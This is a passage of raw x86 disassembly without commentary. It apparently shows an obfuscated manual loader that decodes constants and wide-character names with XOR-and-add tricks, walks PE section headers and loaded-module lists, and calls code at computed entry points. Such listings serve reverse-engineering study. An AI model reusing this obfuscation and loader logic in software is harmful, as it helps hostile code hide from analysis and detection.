  414056:	mov    ecx,DWORD PTR [edi+0x18c]
  41405c:	cmp    edx,DWORD PTR [ecx]
  41405e:	jne    0x414049
  414060:	mov    edx,DWORD PTR [eax+0x18]
  414063:	mov    ecx,DWORD PTR [edi+0x18c]
  414069:	cmp    edx,DWORD PTR [ecx]
  41406b:	jne    0x41407e
  41406d:	mov    edx,DWORD PTR [ebp-0x1c]
  414070:	mov    ecx,DWORD PTR [edi+0x190]
  414076:	mov    edx,DWORD PTR [edx+0x28]
  414079:	add    edx,DWORD PTR [ecx]
  41407b:	mov    DWORD PTR [eax+0x1c],edx
  41407e:	mov    eax,DWORD PTR [ebp+0xc]
  414081:	push   edi
  414082:	push   eax
  414083:	push   DWORD PTR [ebp+0x20]
  414086:	call   0x4138a9
  41408b:	test   eax,eax
  41408d:	je     0x414156
  414093:	push   DWORD PTR [ebp+0xc]
  414096:	mov    ecx,edi
  414098:	push   DWORD PTR [ebp+0x20]
  41409b:	call   0x413802
  4140a0:	test   eax,eax
  4140a2:	je     0x414156
  4140a8:	mov    eax,DWORD PTR [ebp+0xc]
  4140ab:	mov    edx,DWORD PTR [ebp+0x20]
  4140ae:	mov    ecx,edi
  4140b0:	call   0x4136db
  4140b5:	test   eax,eax
  4140b7:	je     0x414156
  4140bd:	push   edi
  4140be:	push   DWORD PTR [ebp+0x20]
  4140c1:	call   0x413b8c
  4140c6:	test   eax,eax
  4140c8:	je     0x414156
  4140ce:	mov    eax,DWORD PTR [edi+0x18c]
  4140d4:	mov    edx,DWORD PTR [ebp+0x20]
  4140d7:	cmp    edx,DWORD PTR [eax]
  4140d9:	jne    0x4140f5
  4140db:	mov    eax,DWORD PTR [edi+0x1d8]
  4140e1:	lea    ecx,[ebp-0x18]
  4140e4:	push   ecx
  4140e5:	push   DWORD PTR [ebp-0x18]
  4140e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4140eb:	push   DWORD PTR [ecx+0x54]
  4140ee:	push   edx
  4140ef:	call   DWORD PTR [eax+0x1c]
  4140f2:	mov    edx,DWORD PTR [ebp+0x20]
  4140f5:	mov    eax,DWORD PTR [edi+0x1c8]
  4140fb:	mov    eax,DWORD PTR [eax]
  4140fd:	xor    eax,esi
  4140ff:	add    eax,ebx
  414101:	je     0x41413a
  414103:	mov    ecx,DWORD PTR [ebp+0xc]
  414106:	mov    eax,DWORD PTR [ecx+0x28]
  414109:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  414110:	mov    esi,DWORD PTR [ebp+0x8]
  414113:	push   DWORD PTR [ebp+0x14]
  414116:	xor    esi,0x896
  41411c:	push   DWORD PTR [ebp+0x10]
  41411f:	add    esi,0x72dd
  414125:	or     WORD PTR [ecx+0x16],si
  414129:	add    eax,edx
  41412b:	push   edx
  41412c:	call   eax
  41412e:	mov    DWORD PTR [edi+0x1d0],0xf89c85b2
  414138:	jmp    0x414144
  41413a:	mov    eax,DWORD PTR [ebp+0xc]
  41413d:	mov    eax,DWORD PTR [eax+0x28]
  414140:	add    eax,edx
  414142:	call   eax
  414144:	mov    DWORD PTR [ebp-0x20],eax
  414147:	mov    eax,DWORD PTR [ebp-0x20]
  41414a:	mov    ecx,DWORD PTR [ebp+0x1c]
  41414d:	mov    DWORD PTR [ecx],eax
  41414f:	mov    DWORD PTR [ebp+0x18],0x1
  414156:	cmp    DWORD PTR [ebp+0x18],0x0
  41415a:	jne    0x414160
  41415c:	and    DWORD PTR [ebp+0x20],0x0
  414160:	mov    eax,DWORD PTR [ebp+0x20]
  414163:	jmp    0x414167
  414165:	xor    eax,eax
  414167:	pop    edi
  414168:	pop    esi
  414169:	pop    ebx
  41416a:	leave  
  41416b:	ret    0x1c
  41416e:	push   ebp
  41416f:	mov    ebp,esp
  414171:	movzx  edx,WORD PTR [ecx+0x6]
  414175:	movzx  eax,WORD PTR [ecx+0x14]
  414179:	push   ebx
  41417a:	push   edi
  41417b:	xor    edi,edi
  41417d:	lea    eax,[eax+ecx*1+0x18]
  414181:	test   edx,edx
  414183:	je     0x4141a4
  414185:	mov    ecx,DWORD PTR [eax+0xc]
  414188:	lea    ebx,[ecx+esi*1]
  41418b:	cmp    DWORD PTR [ebp+0x8],ebx
  41418e:	jb     0x41419c
  414190:	mov    ebx,DWORD PTR [eax+0x8]
  414193:	add    ebx,ecx
  414195:	add    ebx,esi
  414197:	cmp    DWORD PTR [ebp+0x8],ebx
  41419a:	jb     0x4141a6
  41419c:	add    eax,0x28
  41419f:	inc    edi
  4141a0:	cmp    edi,edx
  4141a2:	jb     0x414185
  4141a4:	xor    eax,eax
  4141a6:	pop    edi
  4141a7:	pop    ebx
  4141a8:	pop    ebp
  4141a9:	ret    0x4
  4141ac:	push   ebp
  4141ad:	mov    ebp,esp
  4141af:	sub    esp,0x28
  4141b2:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  4141b9:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  4141c0:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  4141c7:	mov    eax,0x4f9c
  4141cc:	mov    WORD PTR [ebp-0xc],ax
  4141d0:	mov    eax,0x4e7c
  4141d5:	mov    WORD PTR [ebp-0x4],ax
  4141d9:	mov    eax,0x4fa7
  4141de:	mov    WORD PTR [ebp-0x8],ax
  4141e2:	add    eax,0xffffffe0
  4141e5:	mov    WORD PTR [ebp-0x8],ax
  4141e9:	mov    eax,DWORD PTR [ebp+0x8]
  4141ec:	mov    DWORD PTR [ebp-0x14],eax
  4141ef:	mov    eax,DWORD PTR [ebp+0xc]
  4141f2:	mov    DWORD PTR [ebp-0x18],eax
  4141f5:	mov    eax,DWORD PTR [ebp-0x10]
  4141f8:	push   ebx
  4141f9:	mov    ecx,0x7510896
  4141fe:	xor    eax,ecx
  414200:	push   esi
  414201:	mov    esi,DWORD PTR [ebp-0x14]
  414204:	mov    edx,0x3272dd
  414209:	add    eax,edx
  41420b:	push   edi
  41420c:	cmp    esi,eax
  41420e:	je     0x41440c
  414214:	mov    eax,DWORD PTR [ebp-0x10]
  414217:	mov    esi,DWORD PTR [ebp-0x18]
  41421a:	xor    eax,ecx
  41421c:	add    eax,edx
  41421e:	cmp    esi,eax
  414220:	je     0x41440c
  414226:	mov    eax,DWORD PTR [ebp-0x10]
  414229:	xor    eax,ecx
  41422b:	add    eax,edx
  41422d:	mov    DWORD PTR [ebp-0x20],eax
  414230:	mov    eax,DWORD PTR [ebp-0x10]
  414233:	xor    eax,ecx
  414235:	add    eax,edx
  414237:	mov    DWORD PTR [ebp-0x24],eax
  41423a:	movzx  esi,WORD PTR [ebp-0x4]
  41423e:	movzx  edi,WORD PTR [ebp-0xc]
  414242:	mov    eax,0x8a89
  414247:	xor    si,ax
  41424a:	mov    ebx,0x8a89
  41424f:	xor    di,bx
  414252:	mov    eax,0x3b4c
  414257:	add    si,ax
  41425a:	add    di,ax
  41425d:	sub    edi,esi
  41425f:	mov    WORD PTR [ebp-0xc],di
  414263:	mov    esi,DWORD PTR [ebp-0x20]
  414266:	mov    edi,DWORD PTR [ebp-0x14]
  414269:	mov    si,WORD PTR [edi+esi*2]
  41426d:	mov    WORD PTR [ebp+0x8],si
  414271:	mov    esi,DWORD PTR [ebp-0x24]
  414274:	mov    edi,DWORD PTR [ebp-0x18]
  414277:	mov    si,WORD PTR [edi+esi*2]
  41427b:	mov    WORD PTR [ebp+0xc],si
  41427f:	mov    esi,0x72dd
  414284:	jmp    0x414391
  414289:	mov    edi,DWORD PTR [ebp-0x10]
  41428c:	mov    bx,WORD PTR [ebp+0xc]
  414290:	xor    edi,0x896
  414296:	add    edi,esi
  414298:	cmp    bx,di
  41429b:	je     0x4143bb
  4142a1:	mov    edi,DWORD PTR [ebp-0x10]
  4142a4:	mov    ebx,DWORD PTR [ebp+0x10]
  4142a7:	xor    edi,ecx
  4142a9:	add    edi,edx
  4142ab:	cmp    ebx,edi
  4142ad:	mov    di,WORD PTR [ebp+0xc]
  4142b1:	mov    bx,WORD PTR [ebp+0x8]
  4142b5:	je     0x414348
  4142bb:	cmp    bx,di
  4142be:	je     0x414351
  4142c4:	mov    di,WORD PTR [ebp-0x4]
  4142c8:	mov    ebx,0x8a89
  4142cd:	xor    di,bx
  4142d0:	mov    bx,WORD PTR [ebp+0x8]
  4142d4:	add    di,ax
  4142d7:	cmp    bx,di
  4142da:	jb     0x414302
  4142dc:	mov    di,WORD PTR [ebp-0x8]
  4142e0:	mov    ebx,0x8a89
  4142e5:	xor    di,bx
  4142e8:	mov    bx,WORD PTR [ebp+0x8]
  4142ec:	add    di,ax
  4142ef:	cmp    bx,di
  4142f2:	ja     0x414302
  4142f4:	movzx  edi,WORD PTR [ebp+0x8]
  4142f8:	movzx  ebx,WORD PTR [ebp-0xc]
  4142fc:	add    edi,ebx
  4142fe:	mov    WORD PTR [ebp+0x8],di
  414302:	mov    di,WORD PTR [ebp-0x4]
  414306:	mov    ebx,0x8a89
  41430b:	xor    di,bx
  41430e:	mov    bx,WORD PTR [ebp+0xc]
  414312:	add    di,ax
  414315:	cmp    bx,di
  414318:	jb     0x414340
  41431a:	mov    di,WORD PTR [ebp-0x8]
  41431e:	mov    ebx,0x8a89
  414323:	xor    di,bx
  414326:	mov    bx,WORD PTR [ebp+0xc]
  41432a:	add    di,ax
  41432d:	cmp    bx,di
  414330:	ja     0x414340
  414332:	movzx  edi,WORD PTR [ebp+0xc]
  414336:	movzx  ebx,WORD PTR [ebp-0xc]
  41433a:	add    edi,ebx
  41433c:	mov    WORD PTR [ebp+0xc],di
  414340:	mov    di,WORD PTR [ebp+0xc]
  414344:	mov    bx,WORD PTR [ebp+0x8]
  414348:	cmp    bx,di
  41434b:	jne    0x41440c
  414351:	mov    edi,DWORD PTR [ebp-0x28]
  414354:	mov    ebx,DWORD PTR [ebp-0x14]
  414357:	xor    edi,ecx
  414359:	lea    edi,[edi+ebx*1+0x3272dd]
  414360:	mov    DWORD PTR [ebp-0x14],edi
  414363:	mov    edi,DWORD PTR [ebp-0x28]
  414366:	mov    ebx,DWORD PTR [ebp-0x18]
  414369:	xor    edi,ecx
  41436b:	lea    edi,[edi+ebx*1+0x3272dd]
  414372:	mov    DWORD PTR [ebp-0x18],edi
  414375:	mov    edi,DWORD PTR [ebp-0x20]
  414378:	mov    ebx,DWORD PTR [ebp-0x14]
  41437b:	mov    di,WORD PTR [ebx+edi*2]
  41437f:	mov    WORD PTR [ebp+0x8],di
  414383:	mov    edi,DWORD PTR [ebp-0x24]
  414386:	mov    ebx,DWORD PTR [ebp-0x18]
  414389:	mov    di,WORD PTR [ebx+edi*2]
  41438d:	mov    WORD PTR [ebp+0xc],di
  414391:	mov    edi,DWORD PTR [ebp-0x10]
  414394:	mov    bx,WORD PTR [ebp+0x8]
  414398:	xor    edi,0x896
  41439e:	add    edi,esi
  4143a0:	cmp    bx,di
  4143a3:	jne    0x414289
  4143a9:	mov    esi,DWORD PTR [ebp-0x1c]
  4143ac:	xor    esi,ecx
  4143ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4143b1:	add    esi,edx
  4143b3:	imul   esi,ecx
  4143b6:	mov    DWORD PTR [ebp-0x10],esi
  4143b9:	jmp    0x4143cd
  4143bb:	mov    edx,DWORD PTR [ebp-0x10]
  4143be:	xor    edx,ecx
  4143c0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4143c3:	lea    ecx,[edx+ecx*1+0x3272dd]
  4143ca:	mov    DWORD PTR [ebp-0x1c],ecx
  4143cd:	mov    edx,DWORD PTR [ebp-0x20]
  4143d0:	mov    esi,DWORD PTR [ebp-0x14]
  4143d3:	mov    si,WORD PTR [esi+edx*2]
  4143d7:	mov    ecx,eax
  4143d9:	sub    si,cx
  4143dc:	mov    edx,0x8a89
  4143e1:	xor    si,dx
  4143e4:	mov    ecx,0x4e3d
  4143e9:	cmp    si,cx
  4143ec:	jne    0x414407
  4143ee:	mov    esi,DWORD PTR [ebp-0x24]
  4143f1:	mov    edi,DWORD PTR [ebp-0x18]
  4143f4:	mov    si,WORD PTR [edi+esi*2]
  4143f8:	sub    si,ax
  4143fb:	xor    si,dx
  4143fe:	cmp    si,cx
  414401:	jne    0x414407
  414403:	xor    eax,eax
  414405:	jmp    0x414413
  414407:	xor    eax,eax
  414409:	inc    eax
  41440a:	jmp    0x414413
  41440c:	mov    eax,DWORD PTR [ebp-0x1c]
  41440f:	xor    eax,ecx
  414411:	add    eax,edx
  414413:	pop    edi
  414414:	pop    esi
  414415:	pop    ebx
  414416:	leave  
  414417:	ret    0xc
  41441a:	push   ebp
  41441b:	mov    ebp,esp
  41441d:	push   ecx
  41441e:	mov    cx,WORD PTR [eax]
  414421:	push   esi
  414422:	mov    esi,0x3b4c
  414427:	sub    cx,si
  41442a:	mov    esi,0x8a89
  41442f:	xor    cx,si
  414432:	mov    esi,0x4e3d
  414437:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41443e:	mov    edx,0xf89c85b5
  414443:	cmp    cx,si
  414446:	je     0x4144a5
  414448:	push   ebx
  414449:	push   edi
  41444a:	movzx  ecx,cx
  41444d:	mov    edi,0xffcd8d23
  414452:	mov    esi,0x7510896
  414457:	mov    ebx,0x4f99
  41445c:	cmp    cx,bx
  41445f:	jne    0x414464
  414461:	mov    DWORD PTR [ebp-0x4],edx
  414464:	lea    edx,[edi+0x1]
  414467:	xor    edx,esi
  414469:	mov    edi,edx
  41446b:	xor    edi,esi
  41446d:	mov    cx,WORD PTR [eax+edi*2+0x64e5ba]
  414475:	mov    ebx,0x3b4c
  41447a:	sub    cx,bx
  41447d:	mov    ebx,0x8a89
  414482:	xor    cx,bx
  414485:	mov    ebx,0x4e3d
  41448a:	cmp    cx,bx
  41448d:	jne    0x414457
  41448f:	mov    ecx,DWORD PTR [ebp-0x4]
  414492:	pop    edi
  414493:	pop    ebx
  414494:	cmp    ecx,0xf89c85b4
  41449a:	je     0x4144a5
  41449c:	xor    ecx,esi
  41449e:	lea    eax,[eax+ecx*2+0x64e5bc]
  4144a5:	pop    esi
  4144a6:	leave  
  4144a7:	ret    
  4144a8:	push   ebp
  4144a9:	mov    ebp,esp
  4144ab:	push   ecx
  4144ac:	push   esi
  4144ad:	push   edi
  4144ae:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  4144b5:	mov    esi,0xf89c85b5
  4144ba:	call   0x41441a
  4144bf:	mov    edi,eax
  4144c1:	mov    al,BYTE PTR [edi]
  4144c3:	add    al,0xb
  4144c5:	xor    al,0x71
  4144c7:	cmp    al,0x7a
  4144c9:	je     0x41452c
  4144cb:	mov    eax,edi
  4144cd:	mov    edx,0xffcd8d23
  4144d2:	mov    ecx,0x7510896
  4144d7:	push   ebx
  4144d8:	mov    ax,WORD PTR [eax]
  4144db:	mov    ebx,0x3b4c
  4144e0:	sub    ax,bx
  4144e3:	mov    ebx,0x8a89
  4144e8:	xor    ax,bx
  4144eb:	mov    ebx,0x4e6b
  4144f0:	cmp    ax,bx
  4144f3:	jne    0x4144f8
  4144f5:	mov    DWORD PTR [ebp-0x4],esi
  4144f8:	lea    esi,[edx+0x1]
  4144fb:	xor    esi,ecx
  4144fd:	mov    edx,esi
  4144ff:	xor    edx,ecx
  414501:	lea    eax,[edi+edx*2+0x64e5ba]
  414508:	mov    bl,BYTE PTR [eax]
  41450a:	add    bl,0xb
  41450d:	xor    bl,0x71
  414510:	cmp    bl,0x7a
  414513:	jne    0x4144d8
  414515:	mov    eax,DWORD PTR [ebp-0x4]
  414518:	pop    ebx
  414519:	cmp    eax,0xf89c85b4
  41451e:	je     0x41452c
  414520:	xor    eax,ecx
  414522:	xor    ecx,ecx
  414524:	mov    WORD PTR [edi+eax*2+0x64e5ba],cx
  41452c:	mov    eax,edi
  41452e:	pop    edi
  41452f:	pop    esi
  414530:	leave  
  414531:	ret    
  414532:	push   ebp
  414533:	mov    ebp,esp
  414535:	push   ecx
  414536:	push   esi
  414537:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41453e:	mov    esi,0xf89c85b5
  414543:	call   0x41441a
  414548:	mov    cx,WORD PTR [eax]
  41454b:	mov    edx,0x3b4c
  414550:	sub    cx,dx
  414553:	mov    edx,0x8a89
  414558:	xor    cx,dx
  41455b:	mov    edx,0x4e3d
  414560:	cmp    cx,dx
  414563:	je     0x4145bc
  414565:	push   ebx
  414566:	push   edi
  414567:	movzx  ecx,cx
  41456a:	mov    edx,0xffcd8d23
  41456f:	mov    edi,0x7510896
  414574:	mov    ebx,0x4e6b
  414579:	cmp    cx,bx
  41457c:	jne    0x414581
  41457e:	mov    DWORD PTR [ebp-0x4],esi
  414581:	lea    esi,[edx+0x1]
  414584:	xor    esi,edi
  414586:	mov    edx,esi
  414588:	xor    edx,edi
  41458a:	mov    cx,WORD PTR [eax+edx*2+0x64e5ba]
  414592:	mov    ebx,0x3b4c
  414597:	sub    cx,bx
  41459a:	mov    ebx,0x8a89
  41459f:	xor    cx,bx
  4145a2:	mov    ebx,0x4e3d
  4145a7:	cmp    cx,bx
  4145aa:	jne    0x414574
  4145ac:	cmp    DWORD PTR [ebp-0x4],0xf89c85b4
  4145b3:	pop    edi
  4145b4:	pop    ebx
  4145b5:	je     0x4145bc
  4145b7:	xor    eax,eax
  4145b9:	inc    eax
  4145ba:	jmp    0x4145be
  4145bc:	xor    eax,eax
  4145be:	pop    esi
  4145bf:	leave  
  4145c0:	ret    
  4145c1:	push   ebp
  4145c2:	mov    ebp,esp
  4145c4:	push   ecx
  4145c5:	mov    eax,DWORD PTR [ebp+0x8]
  4145c8:	movzx  ecx,WORD PTR [eax]
  4145cb:	push   esi
  4145cc:	lea    eax,[ecx-0x3b4c]
  4145d2:	mov    esi,0x8a89
  4145d7:	push   edi
  4145d8:	xor    eax,esi
  4145da:	mov    edi,0x4e3d
  4145df:	mov    DWORD PTR [ebp-0x4],edx
  4145e2:	cmp    ax,di
  4145e5:	je     0x414612
  4145e7:	mov    eax,DWORD PTR [ebp+0x8]
  4145ea:	sub    eax,edx
  4145ec:	mov    DWORD PTR [ebp+0x8],eax
  4145ef:	jmp    0x4145f4
  4145f1:	mov    eax,DWORD PTR [ebp+0x8]
  4145f4:	mov    WORD PTR [edx],cx
  4145f7:	add    edx,0x2
  4145fa:	movzx  edi,WORD PTR [eax+edx*1]
  4145fe:	mov    ecx,edi
  414600:	add    edi,0xffffc4b4
  414606:	xor    edi,esi
  414608:	mov    eax,0x4e3d
  41460d:	cmp    di,ax
  414610:	jne    0x4145f1
  414612:	xor    eax,eax
  414614:	pop    edi
  414615:	mov    WORD PTR [edx],ax
  414618:	mov    eax,DWORD PTR [ebp-0x4]
  41461b:	pop    esi
  41461c:	leave  
  41461d:	ret    0x4
  414620:	push   ebp
  414621:	mov    ebp,esp
  414623:	sub    esp,0x18
  414626:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  41462d:	mov    DWORD PTR [ebp-0x18],0xf89c85b2
  414634:	mov    eax,DWORD PTR [ebp-0x14]
  414637:	xor    eax,0x7510896
  41463c:	add    eax,0x3272dd
  414641:	mov    DWORD PTR [ebp-0x8],eax
  414644:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41464b:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  414652:	mov    DWORD PTR [ebp-0x4],0xf89c85b3
  414659:	mov    eax,DWORD PTR [ebp-0x14]
  41465c:	xor    eax,0x7510896
  414661:	mov    ecx,DWORD PTR [ebp-0x8]
  414664:	lea    eax,[ecx+eax*1+0x3272dd]
  41466b:	mov    ecx,DWORD PTR [ebp-0x18]
  41466e:	xor    ecx,0x7510896
  414674:	add    ecx,0x3272dd
  41467a:	mov    edx,DWORD PTR [ebp+0x10]
  41467d:	imul   edx,ecx
  414680:	cmp    eax,edx
  414682:	jae    0x414775
  414688:	mov    eax,DWORD PTR [ebp+0x10]
  41468b:	mov    ecx,DWORD PTR [ebp-0x8]
  41468e:	sub    eax,ecx
  414690:	mov    ecx,DWORD PTR [ebp-0x10]
  414693:	xor    ecx,0x7510896
  414699:	add    ecx,0x3272dd
  41469f:	cmp    eax,ecx
  4146a1:	jbe    0x4146d3
  4146a3:	mov    eax,DWORD PTR [ebp+0x8]
  4146a6:	add    eax,DWORD PTR [ebp-0x8]
  4146a9:	mov    ecx,DWORD PTR [ebp+0xc]
  4146ac:	add    ecx,DWORD PTR [ebp-0x8]
  4146af:	mov    edx,DWORD PTR [ecx]
  4146b1:	mov    DWORD PTR [eax],edx
  4146b3:	mov    ecx,DWORD PTR [ecx+0x4]
  4146b6:	mov    DWORD PTR [eax+0x4],ecx
  4146b9:	mov    eax,DWORD PTR [ebp-0x10]
  4146bc:	xor    eax,0x7510896
  4146c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4146c4:	lea    eax,[ecx+eax*1+0x3272dd]
  4146cb:	mov    DWORD PTR [ebp-0x8],eax
  4146ce:	jmp    0x414770
  4146d3:	mov    eax,DWORD PTR [ebp+0x10]
  4146d6:	mov    ecx,DWORD PTR [ebp-0x8]
  4146d9:	sub    eax,ecx
  4146db:	mov    ecx,DWORD PTR [ebp-0xc]
  4146de:	xor    ecx,0x7510896
  4146e4:	add    ecx,0x3272dd
  4146ea:	cmp    eax,ecx
  4146ec:	jbe    0x414715
  4146ee:	mov    eax,DWORD PTR [ebp+0x8]
  4146f1:	add    eax,DWORD PTR [ebp-0x8]
  4146f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4146f7:	add    ecx,DWORD PTR [ebp-0x8]
  4146fa:	mov    ecx,DWORD PTR [ecx]
  4146fc:	mov    DWORD PTR [eax],ecx
  4146fe:	mov    eax,DWORD PTR [ebp-0xc]
  414701:	xor    eax,0x7510896
  414706:	mov    ecx,DWORD PTR [ebp-0x8]
  414709:	lea    eax,[ecx+eax*1+0x3272dd]
  414710:	mov    DWORD PTR [ebp-0x8],eax
  414713:	jmp    0x414770
  414715:	mov    eax,DWORD PTR [ebp+0x10]
  414718:	mov    ecx,DWORD PTR [ebp-0x8]
  41471b:	sub    eax,ecx
  41471d:	mov    ecx,DWORD PTR [ebp-0x4]
  414720:	xor    ecx,0x7510896
  414726:	add    ecx,0x3272dd
  41472c:	cmp    eax,ecx
  41472e:	jbe    0x414759
  414730:	mov    eax,DWORD PTR [ebp+0x8]
  414733:	add    eax,DWORD PTR [ebp-0x8]
  414736:	mov    ecx,DWORD PTR [ebp+0xc]
  414739:	add    ecx,DWORD PTR [ebp-0x8]
  41473c:	mov    cx,WORD PTR [ecx]
  41473f:	mov    WORD PTR [eax],cx
  414742:	mov    eax,DWORD PTR [ebp-0x4]
  414745:	xor    eax,0x7510896
  41474a:	mov    ecx,DWORD PTR [ebp-0x8]
  41474d:	lea    eax,[ecx+eax*1+0x3272dd]
  414754:	mov    DWORD PTR [ebp-0x8],eax
  414757:	jmp    0x414770
  414759:	mov    eax,DWORD PTR [ebp+0x8]
  41475c:	add    eax,DWORD PTR [ebp-0x8]
  41475f:	mov    ecx,DWORD PTR [ebp+0xc]
  414762:	add    ecx,DWORD PTR [ebp-0x8]
  414765:	mov    cl,BYTE PTR [ecx]
  414767:	mov    BYTE PTR [eax],cl
  414769:	mov    eax,DWORD PTR [ebp-0x8]
  41476c:	inc    eax
  41476d:	mov    DWORD PTR [ebp-0x8],eax
  414770:	jmp    0x414659
  414775:	leave  
  414776:	ret    0xc
  414779:	push   ebp
  41477a:	mov    ebp,esp
  41477c:	push   ecx
  41477d:	push   ecx
  41477e:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  414785:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  41478c:	xor    eax,eax
  41478e:	inc    eax
  41478f:	je     0x4147d1
  414791:	mov    eax,DWORD PTR [ebp-0x4]
  414794:	xor    eax,0x7510896
  414799:	add    eax,0x3272dd
  41479e:	cmp    DWORD PTR [ebp+0xc],eax
  4147a1:	jne    0x4147a5
  4147a3:	jmp    0x4147d1
  4147a5:	mov    eax,DWORD PTR [ebp-0x8]
  4147a8:	xor    eax,0x7510896
  4147ad:	add    eax,0x3272dd
  4147b2:	mov    ecx,DWORD PTR [ebp+0xc]
  4147b5:	sub    ecx,eax
  4147b7:	mov    DWORD PTR [ebp+0xc],ecx
  4147ba:	mov    eax,DWORD PTR [ebp-0x4]
  4147bd:	xor    eax,0x7510896
  4147c2:	add    eax,0x3272dd
  4147c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4147ca:	add    ecx,DWORD PTR [ebp+0xc]
  4147cd:	mov    BYTE PTR [ecx],al
  4147cf:	jmp    0x41478c
  4147d1:	leave  
  4147d2:	ret    0x8
  4147d5:	push   ebp
  4147d6:	mov    ebp,esp
  4147d8:	sub    esp,0x21c
  4147de:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4147e5:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4147ec:	mov    eax,DWORD PTR [ebp+0x10]
  4147ef:	mov    eax,DWORD PTR [ebp-0x4]
  4147f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4147f5:	push   esi
  4147f6:	push   edi
  4147f7:	mov    edi,0x7510896
  4147fc:	xor    eax,edi
  4147fe:	mov    esi,0x3272dd
  414803:	add    eax,esi
  414805:	cmp    eax,ecx
  414807:	mov    eax,DWORD PTR [ebp-0x4]
  41480a:	jne    0x414815
  41480c:	xor    eax,edi
  41480e:	add    eax,esi
  414810:	jmp    0x4148c1
  414815:	mov    ecx,DWORD PTR [ebp+0xc]
  414818:	xor    eax,edi
  41481a:	add    eax,esi
  41481c:	cmp    eax,ecx
  41481e:	jne    0x414825
  414820:	mov    eax,DWORD PTR [ebp-0x4]
  414823:	jmp    0x41480c
  414825:	lea    eax,[ebp-0x21c]
  41482b:	mov    DWORD PTR [ebp-0x8],eax
  41482e:	mov    eax,DWORD PTR [ebp+0xc]
  414831:	mov    DWORD PTR [ebp-0x10],eax
  414834:	mov    eax,DWORD PTR [ebp-0x4]
  414837:	xor    eax,edi
  414839:	add    eax,esi
  41483b:	mov    DWORD PTR [ebp+0x10],eax
  41483e:	mov    eax,DWORD PTR [ebp+0xc]
  414841:	push   ebx
  414842:	call   0x414532
  414847:	mov    ebx,eax
  414849:	mov    eax,DWORD PTR [ebp+0x8]
  41484c:	mov    eax,DWORD PTR [eax+0x14]
  41484f:	jmp    0x4148a9
  414851:	mov    eax,DWORD PTR [ebp+0xc]
  414854:	sub    eax,0x8
  414857:	mov    DWORD PTR [ebp-0xc],eax
  41485a:	mov    eax,DWORD PTR [ebp-0xc]
  41485d:	mov    eax,DWORD PTR [eax+0x28]
  414860:	call   0x41441a
  414865:	mov    DWORD PTR [ebp+0x10],eax
  414868:	push   DWORD PTR [ebp+0x10]
  41486b:	mov    edx,DWORD PTR [ebp-0x8]
  41486e:	call   0x4145c1
  414873:	mov    eax,DWORD PTR [ebp-0x4]
  414876:	xor    eax,edi
  414878:	add    eax,esi
  41487a:	cmp    eax,ebx
  41487c:	jne    0x414886
  41487e:	mov    eax,DWORD PTR [ebp-0x8]
  414881:	call   0x4144a8
  414886:	mov    eax,DWORD PTR [ebp-0x14]
  414889:	xor    eax,edi
  41488b:	add    eax,esi
  41488d:	push   eax
  41488e:	push   DWORD PTR [ebp-0x10]
  414891:	push   DWORD PTR [ebp-0x8]
  414894:	call   0x4141ac
  414899:	mov    ecx,DWORD PTR [ebp-0x4]
  41489c:	xor    ecx,edi
  41489e:	add    ecx,esi
  4148a0:	cmp    eax,ecx
  4148a2:	je     0x4148c7
  4148a4:	mov    eax,DWORD PTR [ebp+0xc]
  4148a7:	mov    eax,DWORD PTR [eax]
  4148a9:	mov    DWORD PTR [ebp+0xc],eax
  4148ac:	mov    eax,DWORD PTR [ebp+0x8]
  4148af:	mov    ecx,DWORD PTR [ebp+0xc]
  4148b2:	add    eax,0x14
  4148b5:	cmp    ecx,eax
  4148b7:	jne    0x414851
  4148b9:	mov    eax,DWORD PTR [ebp-0x4]
  4148bc:	xor    eax,edi
  4148be:	add    eax,esi
  4148c0:	pop    ebx
  4148c1:	pop    edi
  4148c2:	pop    esi
  4148c3:	leave  
  4148c4:	ret    0xc
  4148c7:	mov    eax,DWORD PTR [ebp-0xc]
  4148ca:	mov    eax,DWORD PTR [eax+0x18]
  4148cd:	jmp    0x4148c0
  4148cf:	push   ebp
  4148d0:	mov    ebp,esp
  4148d2:	mov    eax,DWORD PTR [ebp+0xc]
  4148d5:	sub    esp,0x10
  4148d8:	cmp    DWORD PTR [ebp+0x8],0x0
  4148dc:	push   ebx
  4148dd:	push   esi
  4148de:	push   edi
  4148df:	je     0x414994
  4148e5:	test   eax,eax
  4148e7:	je     0x414994
  4148ed:	movzx  eax,WORD PTR [eax+0x20]
  4148f1:	mov    ecx,eax
  4148f3:	mov    DWORD PTR [ebp-0x10],eax
  4148f6:	xor    edx,edx
  4148f8:	and    DWORD PTR [ebp-0x8],edx
  4148fb:	mov    eax,0x8a89
  414900:	xor    ecx,eax
  414902:	add    ecx,0x3b4c
  414908:	mov    DWORD PTR [ebp-0xc],ecx
  41490b:	and    DWORD PTR [ebp-0x4],0x0
  41490f:	xor    ecx,ecx
  414911:	push   0x7c
  414913:	pop    edi
  414914:	cmp    cx,WORD PTR [ebp-0xc]
  414918:	jae    0x41497e
  41491a:	lea    esi,[edx-0x3b4c]
  414920:	xor    esi,eax
  414922:	movzx  ecx,WORD PTR [ebp-0x4]
  414926:	mov    ebx,DWORD PTR [ebp+0xc]
  414929:	lea    ecx,[ebx+ecx*4]
  41492c:	cmp    WORD PTR [ecx+0x2],si
  414930:	jne    0x414969
  414932:	movzx  ecx,WORD PTR [ecx]
  414935:	mov    edi,0x4e3d
  41493a:	cmp    cx,di
  41493d:	jne    0x41494b
  41493f:	mov    ebx,DWORD PTR [ebp+0x8]
  414942:	movzx  edi,dx
